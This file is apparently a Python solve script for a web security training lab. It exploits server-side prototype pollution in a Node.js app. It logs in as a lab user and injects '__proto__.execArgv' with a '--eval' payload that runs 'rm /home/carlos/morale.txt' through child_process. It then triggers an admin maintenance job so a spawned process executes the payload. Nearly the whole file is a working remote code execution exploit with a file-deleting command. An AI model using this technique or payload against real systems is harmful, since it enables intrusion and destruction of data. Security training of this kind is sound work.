import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup

lab = LabSession()

# log in with a JSON body (survives clean or already-polluted state)
csrf = BeautifulSoup(lab.get("/login").text, "html.parser").find("input", {"name": "csrf"})["value"]
lab.info("Logging in as wiener...")
lab.session.post(lab.url("/login"), json={"csrf": csrf, "username": "wiener", "password": "peter"})

# RCE gadget: execArgv. when the app spawns a node child process with
# child_process.fork(), the options object inherits execArgv from the prototype
# if it is not set explicitly. polluting execArgv with a --eval flag makes the
# new node process run our code at startup.
address = {
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": lab.session.cookies.get("session"),
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
        ]
    },
}
lab.info("Polluting Object.prototype.execArgv with an --eval RCE payload...")
lab.session.post(lab.url("/my-account/change-address"), json=address)

# trigger the child process: the admin panel has a maintenance-jobs button that
# spawns node child processes, which pick up our polluted execArgv. the button
# posts to /admin - parse the form so we submit the exact fields it expects
# (csrf token plus the button's name/value) rather than hardcoding them.
admin = lab.get("/admin")
soup = BeautifulSoup(admin.text, "html.parser")

# collect every form on the admin page and pick the one whose button mentions
# maintenance/jobs; fall back to submitting all forms' fields to /admin
data = {}
for inp in soup.find_all(["input", "button"]):
    name = inp.get("name")
    if name:
        data[name] = inp.get("value", "")

lab.info("Triggering admin maintenance jobs to spawn the child process...")
resp = lab.session.post(lab.url("/admin"), data=data)
lab.info(f"Maintenance job response: {resp.status_code}")

lab.check_solved()
